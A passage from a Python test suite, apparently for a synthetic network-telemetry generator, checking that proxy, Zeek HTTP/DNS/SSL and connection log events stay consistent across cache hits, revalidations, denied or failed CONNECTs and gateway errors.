        assert proxy_event.protocol.proxy.time_taken < 2000
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.protocol.http.method == "CONNECT"
        assert http_event.protocol.http.status_code == 403
        assert (
            http_event.protocol.http.response_body_len
            == proxy_event.protocol.proxy.response_body_bytes
        )
        assert http_event.protocol.http.response_body_len < proxy_event.protocol.proxy.sc_bytes
        error_response = next(ft for ft in http_event.protocol.file_transfers if not ft.is_orig)
        assert error_response.total_bytes == http_event.protocol.http.response_body_len
        assert error_response.mime_type == "text/html"
        assert http_event.protocol.http.resp_fuids == (error_response.fuid,)
        assert ("10.0.3.10", "93.184.216.34", 443) not in _conn_pairs(emitters)

    def test_cache_hit_request_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/status.gif",
                host="example.com",
                status_code=200,
                sc_bytes=5200,
                cs_bytes=420,
                time_taken=80,
                user_agent="Mozilla/5.0",
                content_type="image/gif",
                cache_result="HIT",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/status.gif",
                version="1.1",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["image/gif"],
            ),
        )

        pairs = _conn_pairs(emitters)
        assert pairs
        assert all(pair == ("10.0.1.10", "10.0.3.10", 8080) for pair in pairs)
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.cache_result == "HIT"
        assert proxy_event.protocol.proxy.status_code == 200
        assert emitters["zeek_http"].emit.called
        assert all(
            call.args[0].network.dst_ip == "10.0.3.10"
            for call in emitters["zeek_http"].emit.call_args_list
        )

    def test_cache_hit_proxy_sc_bytes_match_response_plus_overhead(self, monkeypatch):
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        class FixedRng:
            def random(self) -> float:
                return 0.1

            def randint(self, low: int, high: int) -> int:
                return low

            def choice(self, values):
                return values[0]

        monkeypatch.setattr(generator_module, "_get_rng", lambda: FixedRng())
        monkeypatch.setattr(generator_module, "pick_proxy_domain_user_agent", lambda *a, **k: None)

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=80,
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/status.gif",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["image/gif"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.cache_result == "HIT"
        assert proxy_context.sc_bytes == 5050
        assert proxy_context.cs_bytes == 580

    def test_proxy_304_revalidation_keeps_object_mime_and_cache_label(self, monkeypatch):
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        class FixedRng:
            def random(self) -> float:
                return 0.8

            def randint(self, low: int, high: int) -> int:
                return low

            def choice(self, values):
                return values[0]

            def uniform(self, low: float, _high: float) -> float:
                return low

        monkeypatch.setattr(generator_module, "_get_rng", lambda: FixedRng())
        monkeypatch.setattr(generator_module, "pick_proxy_domain_user_agent", lambda *a, **k: None)

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=0,
            hostname="cdn.example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="cdn.example.com",
                uri="/assets/app.bundle.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=0,
                status_code=304,
                status_msg="Not Modified",
                resp_mime_types=[],
            ),
            explicit_mode=True,
        )

        assert proxy_context.status_code == 304
        assert proxy_context.cache_result == "REVALIDATED"
        assert proxy_context.content_type == "application/javascript"
        assert proxy_context.sc_bytes == 50

    def test_proxy_304_revalidation_is_not_gated_by_cacheable_mime(self):
        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="13.107.6.171",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=0,
            hostname="res.cdn.office.net",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="res.cdn.office.net",
                uri="/",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=0,
                status_code=304,
                status_msg="Not Modified",
                resp_mime_types=["text/html"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.status_code == 304
        assert proxy_context.cache_result == "REVALIDATED"
        assert proxy_context.content_type == "text/html"

    def test_proxy_304_revalidation_keeps_origin_and_omits_zeek_response_mime(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=0,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="cdn.example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="cdn.example.com",
                uri="/assets/app.bundle.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                response_body_len=0,
                status_code=304,
                status_msg="Not Modified",
                resp_mime_types=[],
            ),
        )

        origin_ip = resolve_domain_ip("cdn.example.com", src_host="PROXY-01")
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.status_code == 304
        assert proxy_event.protocol.proxy.cache_result == "REVALIDATED"
        assert proxy_event.protocol.proxy.content_type == "application/javascript"
        assert ("10.0.3.10", origin_ip, 443) in _conn_pairs(emitters)

        http_events = [
            call.args[0]
            for call in emitters["zeek_http"].emit.call_args_list
            if call.args[0].protocol.http.uri == "/assets/app.bundle.js"
        ]
        assert len(http_events) == 1
        assert all(event.protocol.http.status_code == 304 for event in http_events)
        assert all(event.protocol.http.response_body_len == 0 for event in http_events)
        assert all(event.protocol.http.resp_mime_types == () for event in http_events)

    def test_supplied_http_user_agent_survives_domain_override(self, monkeypatch):
        """Proxy context must preserve caller-owned request metadata for correlated egress."""
        import evidenceforge.generation.activity.generator as generator_module

        generator, _ = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy_system = generator._ip_to_system["10.0.3.10"]
        monkeypatch.setattr(
            generator_module,
            "pick_proxy_domain_user_agent",
            lambda *a, **k: "python-requests/2.31.0",
        )

        proxy_context = generator._build_proxy_context(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            source_system=generator._ip_to_system["10.0.1.10"],
            proxy_sys=proxy_system,
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/portal",
                version="1.1",
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                response_body_len=5000,
                status_code=200,
                status_msg="OK",
                resp_mime_types=["text/html"],
            ),
            explicit_mode=True,
        )

        assert proxy_context.user_agent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    def test_auth_required_connect_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=407,
                sc_bytes=700,
                cs_bytes=320,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="AUTH_REQUIRED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.status_code == 407
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.protocol.http.method == "CONNECT"
        assert http_event.protocol.http.status_code == 407
        assert http_event.protocol.http.request_body_len == 0
        assert (
            http_event.protocol.http.response_body_len
            == proxy_event.protocol.proxy.response_body_bytes
        )
        assert http_event.protocol.http.response_body_len < proxy_event.protocol.proxy.sc_bytes
        assert not emitters["zeek_ssl"].emit.called

    def test_supplied_denied_proxy_context_stops_before_origin_side_sources(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            proxy=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=403,
                sc_bytes=700,
                cs_bytes=320,
                time_taken=250,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="DENIED",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            ),
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.status_code == 403
        assert not emitters["zeek_ssl"].emit.called

    def test_failed_connect_status_messages_are_status_specific(self):
        from evidenceforge.generation.activity.network_params import proxy_connect_status_messages

        configured_messages = proxy_connect_status_messages()
        for status_code in (407, 502, 503, 504):
            generator, emitters = _generator(
                [
                    NetworkSensor(
                        type="network",
                        name="both-sides",
                        monitoring_segments=["workstations", "dmz"],
                        direction="bidirectional",
                        log_formats=["zeek"],
                    )
                ]
            )
            cache_result = "AUTH_REQUIRED" if status_code == 407 else "GATEWAY_ERROR"

            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=datetime(2024, 1, 15, 10, status_code % 60, 0, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service="ssl",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                conn_state="SF",
                proxy=ProxyContext(
                    client_ip="10.0.1.10",
                    method="CONNECT",
                    url="example.com:443",
                    host="example.com",
                    status_code=status_code,
                    sc_bytes=700,
                    cs_bytes=320,
                    time_taken=250,
                    user_agent="Mozilla/5.0",
                    content_type="text/html",
                    cache_result=cache_result,
                    referrer="-",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            )

            http_event = emitters["zeek_http"].emit.call_args.args[0]
            proxy_event = emitters["proxy_access"].emit.call_args.args[0]
            assert http_event.protocol.http.status_code == status_code
            assert http_event.protocol.http.status_msg in configured_messages[status_code]
            assert http_event.protocol.http.status_msg != "Proxy Error"
            assert (
                http_event.protocol.http.response_body_len
                == proxy_event.protocol.proxy.response_body_bytes
            )
            assert http_event.protocol.http.response_body_len < proxy_event.protocol.proxy.sc_bytes
            assert not emitters["zeek_ssl"].emit.called

    def test_gateway_failure_emits_only_attempted_origin_transport(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=504,
                sc_bytes=700,
                cs_bytes=320,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="GATEWAY_ERROR",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        origin_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10" and call.args[0].network.dst_port == 443
        ]
        assert len(origin_events) == 1
        assert origin_events[0].network.conn_state == "S0"
        assert origin_events[0].protocol.http is None
        assert origin_events[0].protocol.ssl is None
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.transaction.terminal_outcome == "gateway_failure"
        assert proxy_event.protocol.proxy.transaction.origin_response_at is None

    def test_plaintext_gateway_failure_keeps_client_upload_file_only(self):
        """A sent plaintext body is analyzed on the client leg, not an S0 origin attempt."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="POST",
                url="http://example.com/upload",
                host="example.com",
                status_code=504,
                sc_bytes=700,
                cs_bytes=4416,
                request_body_bytes=4096,
                response_body_bytes=380,
                user_agent="agent/1.0",
                content_type="text/html",
                cache_result="GATEWAY_ERROR",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=4416,
            resp_bytes=700,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="example.com",
                uri="/upload",
                user_agent="agent/1.0",
                request_body_len=4096,
                response_body_len=380,
                status_code=504,
                status_msg="Gateway Timeout",
            ),
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
        )
        upload = next(ft for ft in client_event.protocol.file_transfers if ft.is_orig)
        assert upload.total_bytes == 4096
        assert client_event.protocol.http.orig_fuids == (upload.fuid,)
        error_response = next(ft for ft in client_event.protocol.file_transfers if not ft.is_orig)
        assert error_response.total_bytes == 380
        assert error_response.mime_type == "text/html"
        assert client_event.protocol.http.resp_fuids == (error_response.fuid,)

        origin_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.3.10"
            and call.args[0].network.dst_ip == "93.184.216.34"
        ]
        assert origin_events == []

    def test_proxy_network_children_share_the_proxy_action_parent(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/index.html",
                host="example.com",
                status_code=200,
                sc_bytes=5200,
                cs_bytes=420,
                user_agent="Mozilla/5.0",
                content_type="text/html",
                cache_result="MISS",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        transport_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if (
                call.args[0].network.src_ip,
                call.args[0].network.dst_port,
            )
            in {("10.0.1.10", 8080), ("10.0.3.10", 80)}
        ]
        assert len(transport_events) == 2
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        parent_group = proxy_event.protocol.proxy.transaction.stable_id
        assert all(event.lifecycle.parent_group_id == parent_group for event in transport_events)

    def test_proxy_lookup_uses_phase_planned_dns_rtt_and_origin_anchor(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        selected_plan = None
        dns_event = None
        origin_event = None
        for offset in range(30):
            for emitter in emitters.values():
                emitter.reset_mock()
            request_time = datetime(2024, 1, 15, 10, 0, offset, tzinfo=UTC)
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="93.184.216.34",
                time=request_time,
                dst_port=80,
                proto="tcp",
                service="http",
                duration=0.4,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=generator._ip_to_system["10.0.1.10"],
                hostname="example.com",
                conn_state="SF",
                proxy=ProxyContext(
                    client_ip="10.0.1.10",
                    method="GET",
                    url="http://example.com/index.html",
                    host="example.com",
                    status_code=200,
                    sc_bytes=5200,
                    cs_bytes=420,
                    user_agent="Mozilla/5.0",
                    content_type="text/html",
                    cache_result="MISS",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            )
            proxy_event = emitters["proxy_access"].emit.call_args.args[0]
            plan = proxy_event.protocol.proxy.transaction
            if plan.resolver_mode != "ordinary_lookup":
                continue
            selected_plan = plan
            dns_event = next(
                call.args[0]
                for call in emitters["zeek_dns"].emit.call_args_list
                if call.args[0].dns.query == "example.com"
                and call.args[0].dns.qtype in {1, 28}
                and call.args[0].lifecycle.parent_group_id == plan.stable_id
            )
            origin_event = next(
                call.args[0]
                for call in emitters["zeek_conn"].emit.call_args_list
                if call.args[0].network.src_ip == "10.0.3.10"
                and call.args[0].network.protocol == "tcp"
                and call.args[0].network.dst_port == 80
            )
            break

        assert selected_plan is not None
        assert dns_event is not None
        assert origin_event is not None
        assert dns_event.network.started_at == selected_plan.dns_query_at
        assert dns_event.dns.rtt == pytest.approx(selected_plan.dns_rtt_seconds)
        assert origin_event.network.started_at == selected_plan.origin_connect_at
        assert (
            2
            <= (selected_plan.origin_connect_at - selected_plan.dns_response_at).total_seconds()
            * 1000
            <= 35
        )

    def test_port_only_web_connection_resolves_origin_from_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._dns_server_ips = ["10.0.0.1"]

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="10.0.0.1",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service=None,
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            emit_dns=True,
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        origin_pairs = [pair for pair in pairs if pair[0] == "10.0.3.10" and pair[2] == 443]
        assert origin_pairs
        assert all(pair[1] != "10.0.0.1" for pair in origin_pairs)
        assert all(pair[0] != "10.0.1.10" or pair[1] == "10.0.3.10" for pair in pairs)
        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        transaction = proxy_event.protocol.proxy.transaction
        assert transaction is not None
        origin_dns_events = [
            event
            for event in dns_events
            if event.dns.query == "example.com" and event.dns.qtype in {1, 28}
        ]
        assert all(event.network.src_ip == "10.0.3.10" for event in dns_events)
        assert all(event.network.dst_ip == "10.0.0.1" for event in dns_events)
        if transaction.resolver_mode == "resolver_cache_hit":
            assert not origin_dns_events
        else:
            assert origin_dns_events
            assert all("10.0.0.1" not in event.dns.answers for event in origin_dns_events)
        assert all(event.dns.query != "PROXY-01.example.org" for event in dns_events)

    def test_scenario_identity_overrides_preserved_proxy_origin_ip(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        generator._dns_server_ips = ["10.0.0.1"]
        generator._network_resolver = ScenarioNetworkResolver(
            [
                NetworkIdentity(
                    id="mail_fin",
                    hosts=["mail-fin.example.com"],
                    ips=["10.0.2.27"],
                    tags=["email"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="54.230.228.12",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="mail-fin.example.com",
            emit_dns=True,
            conn_state="SF",
            preserve_dst_ip=True,
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "10.0.2.27", 443) in pairs
        assert ("10.0.3.10", "54.230.228.12", 443) not in pairs

        dns_events = [
            call.args[0]
            for call in emitters["zeek_dns"].emit.call_args_list
            if call.args[0].dns and call.args[0].dns.query == "mail-fin.example.com"
        ]
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        transaction = proxy_event.protocol.proxy.transaction
        assert transaction is not None
        if transaction.resolver_mode == "resolver_cache_hit":
            assert not dns_events
        else:
            assert dns_events
            assert any("10.0.2.27" in event.dns.answers for event in dns_events)
            assert all("54.230.228.12" not in event.dns.answers for event in dns_events)

    def test_email_dns_system_overrides_preserved_proxy_origin_ip(self, monkeypatch):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
                NetworkSensor(
                    type="network",
                    name="egress-tap",
                    monitoring_segments=["dmz"],
                    direction="outbound",
                    log_formats=["zeek"],
                ),
            ]
        )
        mail_server = _system("MAIL-FIN", "10.0.2.27", ["mail_server"])
        generator._ip_to_system[mail_server.ip] = mail_server
        generator._dns_server_ips = ["10.0.0.1"]

        monkeypatch.setattr(
            generator,
            "_email_dns_system_for_hostname",
            lambda hostname: (
                mail_server
                if str(hostname or "").lower().rstrip(".") == "mail-fin.example.com"
                else None
            ),
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="54.230.228.12",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="mail-fin.example.com",
            emit_dns=True,
            conn_state="SF",
            preserve_dst_ip=True,
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", "10.0.2.27", 443) in pairs
        assert ("10.0.3.10", "54.230.228.12", 443) not in pairs

        dns_events = [
            call.args[0]
            for call in emitters["zeek_dns"].emit.call_args_list
            if call.args[0].dns and call.args[0].dns.query == "mail-fin.example.com"
        ]
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        transaction = proxy_event.protocol.proxy.transaction
        assert transaction is not None
        if transaction.resolver_mode == "resolver_cache_hit":
            assert not dns_events
        else:
            assert dns_events
            assert any("10.0.2.27" in event.dns.answers for event in dns_events)
            assert all("54.230.228.12" not in event.dns.answers for event in dns_events)

    def test_private_destination_without_hostname_does_not_invent_public_dns(self):
        from evidenceforge.generation.activity.network import REVERSE_DNS

        workstation = _system("WKS-01", "10.0.1.10")
        state_manager = StateManager()
        state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        emitters = _emitters()
        generator = ActivityGenerator(state_manager, emitters)
        generator._ip_to_system = {workstation.ip: workstation}
        generator._dns_server_ips = ["10.0.0.1"]
        generator._ad_domain = "example.org"

        previous_reverse = REVERSE_DNS.pop("10.0.0.1", None)
        try:
            generator.generate_connection(
                src_ip="10.0.1.10",
                dst_ip="10.0.0.1",
                time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service=None,
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=workstation,
                emit_dns=True,
                conn_state="SF",
            )
        finally:
            if previous_reverse is None:
                REVERSE_DNS.pop("10.0.0.1", None)
            else:
                REVERSE_DNS["10.0.0.1"] = previous_reverse

        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        assert dns_events
        assert all(event.network.src_ip == "10.0.1.10" for event in dns_events)
        queries = {event.dns.query for event in dns_events}
        assert any(query.endswith(".example.org") for query in queries)
        assert not any(
            public_hint in query
            for query in queries
            for public_hint in ("hotjar", "hubspot", "amplitude", "intercom", "linkedin")
        )

    def test_established_ssl_connection_always_has_ssl_context(self):
        state_manager = StateManager()
        state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
        emitters = _emitters()
        generator = ActivityGenerator(state_manager, emitters)

        generator.generate_connection(
            src_ip="10.0.3.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            hostname="example.com",
            conn_state="S0",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/",
                version="1.1",
                status_code=200,
                status_msg="OK",
            ),
        )

        conn_event = emitters["zeek_conn"].emit.call_args.args[0]
        assert conn_event.network.conn_state == "SF"
        assert conn_event.network.orig_bytes > 0
        assert conn_event.network.resp_bytes > 0
        assert conn_event.network.orig_pkts > 0
        assert conn_event.network.resp_pkts > 0
        assert conn_event.protocol.ssl is not None
        assert conn_event.protocol.ssl.established is True
        assert conn_event.protocol.leaf_certificate is not None
        assert conn_event.protocol.x509_chain[0] is conn_event.protocol.leaf_certificate
        assert conn_event.protocol.ssl.cert_chain_fuids == tuple(
            cert.fuid for cert in conn_event.protocol.x509_chain
        )
